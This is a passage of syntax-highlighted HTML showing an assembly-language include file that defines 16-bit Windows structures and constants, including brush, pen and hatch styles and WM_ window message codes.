  </span><span class="sc5">res_x</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">res_y</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">maxsize_x</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">maxsize_y</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">maxposition_x</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">maxposition_y</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">mintrackposition_x</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">mintrackposition_y</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">maxtrackposition_x</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">maxtrackposition_y</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MINMAXINFO</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Stock Logical Objects</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WHITE_BRUSH</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LTGRAY_BRUSH</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">GRAY_BRUSH</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">DKGRAY_BRUSH</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">BLACK_BRUSH</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">NULL_BRUSH</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">HOLLOW_BRUSH</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">WHITE_PEN</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">BLACK_PEN</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">NULL_PEN</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">DOT_MARKER</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">OEM_FIXED_FONT</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">ANSI_FIXED_FONT</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">ANSI_VAR_FONT</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">SYSTEM_FONT</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">DEVICE_DEFAULT_FONT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">DEFAULT_PALETTE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">SYSTEM_FIXED_FONT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Brush Styles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">BS_SOLID</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BS_NULL</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">BS_HOLLOW</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">BS_NULL</span><span class="sc0">
</span><span class="sc5">BS_HATCHED</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">BS_PATTERN</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">BS_INDEXED</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">BS_DIBPATTERN</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hatch Styles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">HS_HORIZONTAL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; -----</span><span class="sc0">
</span><span class="sc5">HS_VERTICAL</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; |||||</span><span class="sc0">
</span><span class="sc5">HS_FDIAGONAL</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; \\\\\
HS_BDIAGONAL    =   3       ; /////</span><span class="sc0">
</span><span class="sc5">HS_CROSS</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; +++++</span><span class="sc0">
</span><span class="sc5">HS_DIAGCROSS</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; xxxxx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Pen Styles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">PS_SOLID</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PS_DASH</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; -------</span><span class="sc0">
</span><span class="sc5">PS_DOT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; .......</span><span class="sc0">
</span><span class="sc5">PS_DASHDOT</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; _._._._</span><span class="sc0">
</span><span class="sc5">PS_DASHDOTDOT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; _.._.._</span><span class="sc0">
</span><span class="sc5">PS_NULL</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">PS_INSIDEFRAME</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Window State Messages</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">NOWM</span><span class="sc0">
</span><span class="sc5">WM_STATE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0000H</span><span class="sc0">

</span><span class="sc5">WM_NULL</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">WM_CREATE</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">WM_DESTROY</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">WM_MOVE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0003h</span><span class="sc0">
</span><span class="sc5">WM_SIZE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0005h</span><span class="sc0">
</span><span class="sc5">WM_ACTIVATE</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0006h</span><span class="sc0">
</span><span class="sc5">WM_SETFOCUS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0007h</span><span class="sc0">
</span><span class="sc5">WM_KILLFOCUS</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">WM_ENABLE</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000Ah</span><span class="sc0">
</span><span class="sc5">WM_SETREDRAW</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000Bh</span><span class="sc0">
</span><span class="sc5">WM_SETTEXT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000Ch</span><span class="sc0">
</span><span class="sc5">WM_GETTEXT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000Dh</span><span class="sc0">
</span><span class="sc5">WM_GETTEXTLENGTH</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000Eh</span><span class="sc0">
</span><span class="sc5">WM_PAINT</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000Fh</span><span class="sc0">
</span><span class="sc5">WM_CLOSE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">
</span><span class="sc5">WM_QUERYENDSESSION</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0011h</span><span class="sc0">
</span><span class="sc5">WM_QUIT</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0012h</span><span class="sc0">
</span><span class="sc5">WM_QUERYOPEN</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0013h</span><span class="sc0">
</span><span class="sc5">WM_ERASEBKGND</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0014h</span><span class="sc0">
</span><span class="sc5">WM_SYSCOLORCHANGE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0015h</span><span class="sc0">
</span><span class="sc5">WM_ENDSESSION</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0016h</span><span class="sc0">
</span><span class="sc5">WM_SYSTEMERROR</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0017h</span><span class="sc0">
</span><span class="sc5">WM_SHOWWINDOW</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">
</span><span class="sc5">WM_CTLCOLOR</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0019h</span><span class="sc0">
</span><span class="sc5">WM_WININICHANGE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001Ah</span><span class="sc0">
</span><span class="sc5">WM_DEVMODECHANGE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001Bh</span><span class="sc0">
</span><span class="sc5">WM_ACTIVATEAPP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001Ch</span><span class="sc0">
</span><span class="sc5">WM_FONTCHANGE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001Dh</span><span class="sc0">
</span><span class="sc5">WM_TIMECHANGE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001Eh</span><span class="sc0">
</span><span class="sc5">WM_CANCELMODE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001Fh</span><span class="sc0">
</span><span class="sc5">WM_SETCURSOR</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
</span><span class="sc5">WM_MOUSEACTIVATE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0021h</span><span class="sc0">
</span><span class="sc5">WM_CHILDACTIVATE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0022h</span><span class="sc0">
</span><span class="sc5">WM_QUEUESYNC</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0023h</span><span class="sc0">
</span><span class="sc5">WM_GETMINMAXINFO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0024h</span><span class="sc0">
</span><span class="sc5">WM_PAINTICON</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0026h</span><span class="sc0">
</span><span class="sc5">WM_ICONERASEBKGND</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0027h</span><span class="sc0">
</span><span class="sc5">WM_NEXTDLGCTL</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0028h</span><span class="sc0">
</span><span class="sc5">WM_SPOOLERSTATUS</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002Ah</span><span class="sc0">
</span><span class="sc5">WM_DRAWITEM</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002Bh</span><span class="sc0">
</span><span class="sc5">WM_MEASUREITEM</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002Ch</span><span class="sc0">
</span><span class="sc5">WM_DELETEITEM</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002Dh</span><span class="sc0">
</span><span class="sc5">WM_VKEYTOITEM</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002Eh</span><span class="sc0">
</span><span class="sc5">WM_CHARTOITEM</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002Fh</span><span class="sc0">
</span><span class="sc5">WM_SETFONT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0030h</span><span class="sc0">
</span><span class="sc5">WM_GETFONT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0031h</span><span class="sc0">
</span><span class="sc5">WM_QUERYDRAGICON</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0037h</span><span class="sc0">
</span><span class="sc5">WM_COMPAREITEM</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0039h</span><span class="sc0">
</span><span class="sc5">WM_COMPACTING</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0041h</span><span class="sc0">
</span><span class="sc5">WM_COMMNOTIFY</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0044h</span><span class="sc0">
</span><span class="sc5">WM_WINDOWPOSCHANGING</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0046h</span><span class="sc0">
</span><span class="sc5">WM_WINDOWPOSCHANGED</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0047h</span><span class="sc0">
</span><span class="sc5">WM_POWER</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0048h</span><span class="sc0">

</span><span class="sc5">WM_NCCREATE</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0081h</span><span class="sc0">
</span><span class="sc5">WM_NCDESTROY</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0082h</span><span class="sc0">
</span><span class="sc5">WM_NCCALCSIZE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0083h</span><span class="sc0">
</span><span class="sc5">WM_NCHITTEST</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0084h</span><span class="sc0">
</span><span class="sc5">WM_NCPAINT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0085h</span><span class="sc0">
</span><span class="sc5">WM_NCACTIVATE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0086h</span><span class="sc0">
</span><span class="sc5">WM_GETDLGCODE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0087h</span><span class="sc0">
</span><span class="sc5">WM_NCMOUSEMOVE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A0h</span><span class="sc0">
</span><span class="sc5">WM_NCLBUTTONDOWN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A1h</span><span class="sc0">
</span><span class="sc5">WM_NCLBUTTONUP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A2h</span><span class="sc0">
</span><span class="sc5">WM_NCLBUTTONDBLCLK</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A3h</span><span class="sc0">
</span><span class="sc5">WM_NCRBUTTONDOWN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A4h</span><span class="sc0">
</span><span class="sc5">WM_NCRBUTTONUP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A5h</span><span class="sc0">
</span><span class="sc5">WM_NCRBUTTONDBLCLK</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A6h</span><span class="sc0">
</span><span class="sc5">WM_NCMBUTTONDOWN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A7h</span><span class="sc0">
</span><span class="sc5">WM_NCMBUTTONUP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A8h</span><span class="sc0">
</span><span class="sc5">WM_NCMBUTTONDBLCLK</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00A9h</span><span class="sc0">

</span><span class="sc5">WM_KEYFIRST</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">WM_KEYDOWN</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">WM_KEYUP</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0101h</span><span class="sc0">
</span><span class="sc5">WM_CHAR</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0102h</span><span class="sc0">
</span><span class="sc5">WM_DEADCHAR</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0103h</span><span class="sc0">
</span><span class="sc5">WM_SYSKEYDOWN</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0104h</span><span class="sc0">
</span><span class="sc5">WM_SYSKEYUP</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0105h</span><span class="sc0">
</span><span class="sc5">WM_SYSCHAR</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0106h</span><span class="sc0">
</span><span class="sc5">WM_SYSDEADCHAR</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0107h</span><span class="sc0">
</span><span class="sc5">WM_KEYLAST</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0108h</span><span class="sc0">

</span><span class="sc5">WM_INITDIALOG</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0110h</span><span class="sc0">
</span><span class="sc5">WM_COMMAND</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0111h</span><span class="sc0">
</span><span class="sc5">WM_SYSCOMMAND</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0112h</span><span class="sc0">
</span><span class="sc5">WM_TIMER</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0113h</span><span class="sc0">
</span><span class="sc5">WM_HSCROLL</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0114h</span><span class="sc0">
</span><span class="sc5">WM_VSCROLL</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0115h</span><span class="sc0">
</span><span class="sc5">WM_INITMENU</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0116h</span><span class="sc0">
</span><span class="sc5">WM_INITMENUPOPUP</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0117h</span><span class="sc0">
</span><span class="sc5">WM_MENUSELECT</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">011Fh</span><span class="sc0">
</span><span class="sc5">WM_MENUCHAR</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0120h</span><span class="sc0">
</span><span class="sc5">WM_ENTERIDLE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0121h</span><span class="sc0">


</span><span class="sc5">WM_MOUSEFIRST</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">WM_MOUSEMOVE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">WM_LBUTTONDOWN</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">
</span><span class="sc5">WM_LBUTTONUP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0202h</span><span class="sc0">
</span><span class="sc5">WM_LBUTTONDBLCLK</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0203h</span><span class="sc0">
</span><span class="sc5">WM_RBUTTONDOWN</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0204h</span><span class="sc0">
</span><span class="sc5">WM_RBUTTONUP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0205h</span><span class="sc0">
</span><span class="sc5">WM_RBUTTONDBLCLK</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0206h</span><span class="sc0">
</span><span class="sc5">WM_MBUTTONDOWN</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0207h</span><span class="sc0">
</span><span class="sc5">WM_MBUTTONUP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0208h</span><span class="sc0">
</span><span class="sc5">WM_MBUTTONDBLCLK</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0209h</span><span class="sc0">
</span><span class="sc5">WM_MOUSELAST</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0209h</span><span class="sc0">

</span><span class="sc5">WM_PARENTNOTIFY</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0210h</span><span class="sc0">
</span><span class="sc5">WM_MDICREATE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0220h</span><span class="sc0">
</span><span class="sc5">WM_MDIDESTROY</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0221h</span><span class="sc0">
</span><span class="sc5">WM_MDIACTIVATE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0222h</span><span class="sc0">
</span><span class="sc5">WM_MDIRESTORE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0223h</span><span class="sc0">
</span><span class="sc5">WM_MDINEXT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0224h</span><span class="sc0">
</span><span class="sc5">WM_MDIMAXIMIZE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0225h</span><span class="sc0">
</span><span class="sc5">WM_MDITILE</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0226h</span><span class="sc0">
</span><span class="sc5">WM_MDICASCADE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0227h</span><span class="sc0">
</span><span class="sc5">WM_MDIICONARRANGE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0228h</span><span class="sc0">
</span><span class="sc5">WM_MDIGETACTIVE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0229h</span><span class="sc0">
</span><span class="sc5">WM_MDISETMENU</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0230h</span><span class="sc0">
</span><span class="sc5">WM_DROPFILES</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0233h</span><span class="sc0">


</span><span class="sc5">WM_CUT</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0300h</span><span class="sc0">
</span><span class="sc5">WM_COPY</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0301h</span><span class="sc0">
</span><span class="sc5">WM_PASTE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0302h</span><span class="sc0">
</span><span class="sc5">WM_CLEAR</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0303h</span><span class="sc0">
</span><span class="sc5">WM_UNDO</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0304h</span><span class="sc0">
</span><span class="sc5">WM_RENDERFORMAT</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0305h</span><span class="sc0">
</span><span class="sc5">WM_RENDERALLFORMATS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0306h</span><span class="sc0">
</span><span class="sc5">WM_DESTROYCLIPBOARD</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0307h</span><span class="sc0">
</span><span class="sc5">WM_DRAWCLIPBOARD</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0308h</span><span class="sc0">
</span><span class="sc5">WM_PAINTCLIPBOARD</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0309h</span><span class="sc0">
</span><span class="sc5">WM_VSCROLLCLIPBOARD</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">030Ah</span><span class="sc0">
</span><span class="sc5">WM_SIZECLIPBOARD</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">030Bh</span><span class="sc0">
</span><span class="sc5">WM_ASKCBFORMATNAME</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">030Ch</span><span class="sc0">
</span><span class="sc5">WM_CHANGECBCHAIN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">030Dh</span><span class="sc0">
</span><span class="sc5">WM_HSCROLLCLIPBOARD</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">030Eh</span><span class="sc0">
</span><span class="sc5">WM_QUERYNEWPALETTE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">030Fh</span><span class="sc0">
</span><span class="sc5">WM_PALETTEISCHANGING</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0310h</span><span class="sc0">
</span><span class="sc5">WM_PALETTECHANGED</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0311h</span><span class="sc0">

</span><span class="sc5">WM_PENWINFIRST</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0380h</span><span class="sc0">
</span><span class="sc5">WM_PENWINLAST</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">038Fh</span><span class="sc0">

